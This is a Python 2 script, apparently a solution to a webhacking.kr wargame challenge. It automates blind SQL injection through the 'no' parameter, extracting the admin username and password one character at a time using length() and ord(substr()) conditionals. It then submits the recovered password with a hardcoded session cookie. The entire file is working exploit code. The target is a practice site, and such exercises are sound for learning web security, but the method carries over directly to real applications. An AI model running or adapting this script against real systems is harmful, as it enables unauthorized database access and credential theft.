#-*- coding: utf-8 -*-
import sys
import urllib
import urllib2

import CookieManager


challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-1/index.php"

for noIdx in range(1, 3):
    print "[*] Finding id length"
    idLength = 0
    isFoundIdLength = False
    
    CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
    
    for idLength in range(1, 20):
        parameter = "if(length(id)=%d,%d,3)" % (idLength, noIdx)
        httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            print "[*] Blind SQL Injection...", idLength
            if httpResponse.find("True") > 0:
                print "[+] FIND IT! id length is [", idLength, "]"
                isFoundIdLength = True
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()
    
    if not isFoundIdLength:
        sys.exit(-1)
    
    idValue = ""
    
    for caretIndex in range(1, idLength+1):
        print
        print "[*] Blind SQL Injection...", caretIndex, "", 
        for charIndex in range(0x20, 0x7e):
            sys.stdout.write(".")
            parameter = "if(ord(substr(id,%d,1))=%d,%d,3)" % (caretIndex, charIndex, noIdx)
            httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
            httpRequest.add_header("Cookie", CookieManager.getCookie())
            
            httpConnection = None
            try:
                httpConnection = urllib2.urlopen(httpRequest)
                httpResponse = httpConnection.read()
                if httpResponse.find("True") > 0:
                    print 
                    print "[+] FIND IT!", chr(charIndex)
                    idValue += chr(charIndex)
                    break
            except:
                raise
            finally:
                if httpConnection != None:
                    httpConnection.close()
    
    print
    print "[!] id is [", idValue, "]"
    print
    
    if idValue == "admin":
        print "[*] Finding password length"
        pwLength = 0
        isFoundPwLength = False
        
        CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
        
        for pwLength in range(1, 20):
            parameter = "if(length(pw)=%d,%d,3)" % (pwLength, noIdx)
            httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
            httpRequest.add_header("Cookie", CookieManager.getCookie())
            
            httpConnection = None
            try:
                httpConnection = urllib2.urlopen(httpRequest)
                httpResponse = httpConnection.read()
                print "[*] Blind SQL Injection...", pwLength
                if httpResponse.find("True") > 0:
                    print "[+] FIND IT! pw length is [", pwLength, "]"
                    isFoundIdLength = True
                    break
            except:
                raise
            finally:
                if httpConnection != None:
                    httpConnection.close()
        
        if not isFoundIdLength:
            sys.exit(-1)

        print "[*] Finding pw Value"
        pwValue = ""
        
        for caretIndex in range(1, pwLength+1):
            print
            print "[*] Blind SQL Injection...", caretIndex, "", 
            for charIndex in range(0x20, 0x7e):
                sys.stdout.write(".")
                parameter = "if(ord(substr(pw,%d,1))=%d,%d,3)" % (caretIndex, charIndex, noIdx)
                httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
                httpRequest.add_header("Cookie", CookieManager.getCookie())
                
                httpConnection = None
                try:
                    httpConnection = urllib2.urlopen(httpRequest)
                    httpResponse = httpConnection.read()
                    if httpResponse.find("True") > 0:
                        print 
                        print "[+] FIND IT!", chr(charIndex)
                        pwValue += chr(charIndex)
                        break
                except:
                    raise
                finally:
                    if httpConnection != None:
                        httpConnection.close()
        
        print "[!] pw is [", pwValue, "]"
        break

challengeUrl = "http://webhacking.kr/index.php?mode=auth_go"
parameter = urllib.urlencode({
    "answer": pwValue
});
httpRequest = urllib2.Request(challengeUrl, data=parameter)
CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
